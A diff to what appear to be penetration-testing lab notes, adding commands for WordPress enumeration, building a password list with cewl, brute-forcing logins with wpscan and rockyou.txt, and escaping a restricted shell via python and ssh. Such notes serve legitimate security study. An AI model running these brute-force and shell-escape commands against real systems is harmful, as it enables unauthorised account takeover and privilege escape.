@@ -938,10 +938,14 @@ wpscan --url http://10.11.1.111 --enumerate vp
 
 # aggressive plugin detection
 
-	wpscan --url http://192.168.221.167/ -e u,ap --plugins-detection aggressive
+wpscan --url http://192.168.221.167/ -e u,ap --plugins-detection aggressive
 wpscan --url http://10.11.1.111 --enumerate vt
 wpscan --url http://10.11.1.111 --enumerate u
 wpscan -e --url https://url.com
+
+# Generating password list from website
+
+	cewl http://192.168.x.x > passwords.txt
 
 # Password Cracking
 	wpscan --url http://192.168.x.x:80 --passwords /home/kali/Documents/crack/rockyou.txt --usernames admin,tom,jerry
@@ -2948,6 +2952,10 @@ root@assertion:/#
    		python -c 'import os; os.system("/bin/sh")'
    	3) Reconnecting to server with no profile
     		ssh -o StrictHostKeyChecking=no -i id_rsa tom@192.168.120.138 -t "bash --noprofile"
+
+      After escaping the shell:
+      	export PATH=/bin:/usr/bin:$PATH
+      	export SHELL=/bin/bash:$SHELL
 
 # Last Resort
 
